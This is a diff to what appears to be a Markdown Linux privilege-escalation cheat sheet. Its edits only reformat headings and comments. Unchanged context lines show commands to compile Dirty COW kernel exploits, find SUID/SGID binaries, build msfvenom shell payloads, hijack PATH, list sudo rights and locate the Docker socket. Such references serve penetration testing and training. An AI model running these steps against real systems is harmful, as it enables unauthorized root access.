@@ -8,7 +8,7 @@ https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scrip
 uname -a
 ```
 
-## compile on target (40611.c)
+## compile on target 40611.c
 ```
 gcc -pthread 40611.c -o dirtyc0w
 ```
@@ -23,7 +23,7 @@ gcc -pthread 40611.c -o dirtyc0w
 su <user>
 ```
 
-## compile on target - 40839.c
+## compile on target 40839.c
 ```
 gcc -pthread 40839.c -o dirty -lcrypt
 ```
@@ -54,7 +54,7 @@ gcc cowroot.c -o cowroot -pthread
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 ```
 
-### compile on target - 40847.cpp
+### compile on target 40847.cpp
 ```
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ```
@@ -66,12 +66,12 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 
 
 # Password Mining
+## information about current user
 ```
-# information about current user
 id || (whoami && groups) 2>/dev/null
 ```
 
-## get all local user (try user = password for striking users)
+## get all local user
 ```
 cat /etc/passwd | cut -d ":" -f 1
 ```
@@ -103,17 +103,15 @@ gpg --list-keys
 
 
 # SUID Binaries
+## find SUID enabled files 
 ```
-# find SUID enabled files 
 find / -perm -u=s -type f 2>/dev/null
-# or
 find / -perm +4000 -type f 2>/dev/null
 ```
 
 ## find SGID enabled files
 ```
 find / -perm /2000 -ls 2>/dev/null
-# or
 find / -perm +8000 -ls 2>/dev/null
 ```
 
@@ -128,7 +126,6 @@ strings <binary>
 ## generate shell
 ```
 msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o <file>
-# or
 msfvenom -p linux/x64/exec CMD=/bin/sh -f elf -o <file>
 ```
 
@@ -144,8 +141,8 @@ export PATH=/tmp:$PATH
 
 
 # Sudo
+## show all available sudo commands
 ```
-# show all available sudo commands
 sudo -l
 ```
 
@@ -194,8 +191,6 @@ find / -writable -type d ! -type l -ls 2>/dev/null
 find / -path /proc -prune -o -nouser -o -nogroup 2> /dev/null
 ```
 
-## wildcard injection (search for wildcards: * or ? or [...] inside cron jobs)
-
 
 # running sessions
 ## check for screen sessions
@@ -212,8 +207,8 @@ tmux a -t <sessions>
 
 
 # Docker
+## search socket for docker
 ```
-# search socket for docker
 find / -name docker.sock 2>/dev/nul
 ```
 
@@ -240,7 +235,6 @@ cat /proc/version
 ## list kernel modules
 ```
 lsmod
-# get more information about specific kernel module
 /sbin/modinfo <module>
 ```
 
